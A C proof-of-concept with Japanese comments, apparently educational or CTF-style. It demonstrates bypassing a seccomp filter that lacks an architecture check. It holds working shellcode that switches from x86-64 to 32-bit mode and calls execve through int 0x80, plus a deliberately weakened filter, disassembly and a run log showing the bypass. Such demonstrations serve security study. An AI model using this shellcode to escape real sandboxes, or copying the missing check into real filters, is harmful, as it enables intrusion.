/* システムコール番号のチェックがバイパス可能であることを検証できるサンプル(x86-64) */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stddef.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <linux/seccomp.h>
#include <linux/filter.h>
#include <linux/audit.h>
#include <sys/syscall.h>
#include <sys/prctl.h>

// execve("./write64", ["./write64", 0], 0)
static unsigned char *sc = "\xeb\x0c\x5b\x31\xc0\x99\xb0\x0b\x52\x53\x89\xe1\xcd\x80\xe8\xef\xff\xff\xff\x2e\x2f\x77\x72\x69\x74\x65\x36\x34";
// x86モードに移行するためのshellcode
static unsigned char *x86_stager = "\x48\xc7\xc0\x00\x00\x00\x00\x48\x31\xff\x48\xc7\xc6\x90\x28\x60\x00\x48\xc7\xc2\x80\x00\x00\x00\x0f\x05\xbc\x60\x28\x60\x00\x67\xc7\x44\x24\x04\x23\x00\x00\x00\x67\xc7\x04\x24\x90\x28\x60\x00\xcb";
static int enable_seccomp() ;

int main(int argc, char *argv[]) {
	int pid, code, status;
	pid_t result;
	int pipe_parent2child[2];
	if (pipe(pipe_parent2child) < 0) { perror("popen2"); exit(1); }
	//pid = fork(); // clone(2)
	pid = syscall(SYS_fork); 
	if(pid == -1){ 
		write(2, "ng\n", 3); 
		close(pipe_parent2child[0]); close(pipe_parent2child[1]);
		return 1; 
	}
	if(pid == 0) { // child process
		enable_seccomp();
		close(pipe_parent2child[1]);
		dup2(pipe_parent2child[0], 0);
		close(pipe_parent2child[0]);
#if 0
		char a[0x100] = {0};
		read(0, a, 0x100);
		write(1, a, 0x100);
#endif
#if 1
#if 0
		char *arg[] = {"write64", 0};
		execve("./write64", arg, 0);
#else
		((void (*)(void))x86_stager)();
#endif
#endif
	} else { // parent process
#if 1
		/* ok */
		char a[256] = {0};
		int fd = open("flag", 0);
		read(fd, &a, 256); 
		write(1, "parent: ", 7);
		write(1, &a, 256);
		close(fd);
#endif
		close(pipe_parent2child[0]);
		//write(pipe_parent2child[1], "parent->child: hoge\n", 0x14); 
		write(pipe_parent2child[1], sc, strlen(sc)); 

		result = wait4(pid, &status, 0, 0);
	}
	return 0;
}

static int enable_seccomp() {
	int rc=0;
	struct sock_filter filter[] = {
		// アーキテクチャ情報のロード
		//BPF_STMT(BPF_LD | BPF_W | BPF_ABS, (offsetof(struct seccomp_data, arch))),
		// アーキテクチャ情報のチェック(true:1個先へ，false:0個先への意味)
		//BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, AUDIT_ARCH_I386, 1, 0),
		//BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),
		// アーキテクチャのチェックは必須 
		// チェックが存在しない場合，例えばx86-64からx32の実行コンテキストにすることでシステムコール番号のチェックすり抜けが起き得る
		// システムコール番号のロード
		BPF_STMT(BPF_LD | BPF_W | BPF_ABS, (offsetof(struct seccomp_data, nr))),
		// システムコール番号のチェック
		BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_write, 0, 1),
		BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
		BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_read, 0, 1),
		BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
		BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_exit_group, 0, 1),
		BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
#if 0
		BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_execve, 0, 1),
		BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
#else
		/// execveのみ使用不可
		BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_execve, 1, 0),
		BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
#endif
		BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),
	};
	struct sock_fprog prog = {
	.len = (unsigned short) (sizeof(filter) / sizeof(filter[0])),
	.filter = filter,
	};
	if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)) {
		perror("prctl(NO_NEW_PRIVS)"); rc=1; goto out;
	}
#if 1
	if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog, 0, 0)) {
		perror("prctl(SECCOMP)"); rc=2;
	}
#else
	if (syscall(__NR_seccomp, SECCOMP_SET_MODE_FILTER,0, &prog)) {
		perror("seccomp"); rc=3;
	}
#endif
out:
	return rc;
}
/*
$ readelf -S tp05
(snip)
  [26] .bss              NOBITS           00000000006020a8  000020a8
       0000000000000008  0000000000000000  WA       0     0     4

$ python x86-64_to_x86.py 0x602000 | tohex
\x48\xc7\xc0\x00\x00\x00\x00\x48\x31\xff\x48\xc7\xc6\x90\x28\x60\x00\x48\xc7\xc2\x80\x00\x00\x00\x0f\x05\xbc\x60\x28\x60\x00\x67\xc7\x44\x24\x04\x23\x00\x00\x00\x67\xc7\x04\x24\x90\x28\x60\x00\xcb

$ nasm -o write64_x86.o write64_x86.s ; cat write64_x86.o | tohex
\xeb\x0c\x5b\x31\xc0\x99\xb0\x0b\x52\x53\x89\xe1\xcd\x80\xe8\xef\xff\xff\xff\x2e\x2f\x77\x72\x69\x74\x65\x36\x34

$ objdump -Mintel -b binary -m i386 -D write64_x86.o

write64_x86.o:     ファイル形式 binary


セクション .data の逆アセンブル:

00000000 <.data>:
   0:   eb 0c                   jmp    0xe
   2:   5b                      pop    ebx
   3:   31 c0                   xor    eax,eax
   5:   99                      cdq
   6:   b0 0b                   mov    al,0xb
   8:   52                      push   edx
   9:   53                      push   ebx
   a:   89 e1                   mov    ecx,esp
   c:   cd 80                   int    0x80
   e:   e8 ef ff ff ff          call   0x2
  13:   2e 2f                   cs das      ; "./write64"
  15:   77 72                   ja     0x89
  17:   69                      .byte 0x69
  18:   74 65                   je     0x7f
  1a:   36                      ss
  1b:   34                      .byte 0x34

$ ./write64
execve: hogehoge

$ seccomp-tools dump ./tp05
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000000  A = sys_number
 0001: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0003
 0002: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0003: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0005
 0004: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0005: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0007
 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0007: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0009
 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0009: 0x06 0x00 0x00 0x00000000  return KILL

# ./tp05
parent:FLAG_GGGGGGGGGGGGGGGG
execve: hogehoge ; チェックをすり抜けてexecve(2)を実行できた
*/

